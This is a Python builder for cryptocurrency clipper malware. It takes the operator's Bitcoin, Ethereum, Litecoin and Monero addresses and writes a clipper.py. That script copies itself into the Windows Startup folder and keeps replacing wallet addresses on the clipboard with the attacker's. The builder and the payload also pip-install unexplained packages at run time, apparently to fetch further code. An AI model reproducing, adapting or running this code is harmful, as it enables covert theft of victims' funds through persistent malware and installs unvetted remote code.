import os
os.system("pip install pythoncoloringslibV2")
import pythoncoloringslibV2
print("""
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░█████╗░  ░█████╗░██╗░░░░░██╗██████╗░██████╗░███████╗██████╗░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔══██╗  ██╔══██╗██║░░░░░██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░██║░░██║  ██║░░╚═╝██║░░░░░██║██████╔╝██████╔╝█████╗░░██████╔╝
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░██║░░██║  ██║░░██╗██║░░░░░██║██╔═══╝░██╔═══╝░██╔══╝░░██╔══██╗
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░╚█████╔╝  ╚█████╔╝███████╗██║██║░░░░░██║░░░░░███████╗██║░░██║
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░╚════╝░  ░╚════╝░╚══════╝╚═╝╚═╝░░░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝
--------------------------------------------------------------------------------------------------------------
""")



BITCOIN_ADDRESS = input("YOUR BITCOIN ADDRESS:\n[>>>]")
ETHEREUM_ADDRESS = input("YOUR ETHEREUM ADDRESS:\n[>>>]")
LITECOIN_ADDRESS = input("YOUR LITECOIN ADDRESS:\n[>>>]")
MONERO_ADDRESS = input("YOUR MONERO ADDRESS:\n[>>>]")

addresses = f"""
BTC_address = "{BITCOIN_ADDRESS}"
ETH_address = "{ETHEREUM_ADDRESS}"
MON_address  = "{MONERO_ADDRESS}"
LTC_address = "{LITECOIN_ADDRESS}"
"""
python_script = """
import os
os.system("pip install pylibcrypt pyperclip")
import pylibcrypt
import pyperclip as pc
import time
import re
import time
import shutil

""" + addresses + """


def add_to_startup():
    user = os.getlogin()
    basename = os.path.basename(__file__)
    shutil.copy(os.getcwd() + basename,'C:/Users/'+user+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')

add_to_startup()

def clip():
    s = str(pc.paste())
    length_of_s = len(s)
    btc_check = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", s)
    btc_match = bool(btc_check)
    eth_check = re.match("^0x[a-zA-F0-9]{40}$", s)
    eth_match = bool(eth_check)
    mon_check = re.match("^4([0-9]|[A-B])(.){93}$", s)
    mon_match = bool(mon_check)
    ltc_check = re.match("[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$", s)
    ltc_match = bool(ltc_check)
    wallet_check = ""
    time.sleep(0.25)
    if btc_match == True:
        pc.copy(BTC_address)
    elif eth_match == True:
        pc.copy(ETH_address)
    elif mon_match == True:
        pc.copy(MON_address)
    elif ltc_match == True:
        pc.copy(LTC_address)
    else:
        wallet_check = "ignore"


while True:
    clip()
"""
new_file = open("clipper.py", "w")
new_file.write(python_script)
print("Safed Clipper to: " + new_file.name)
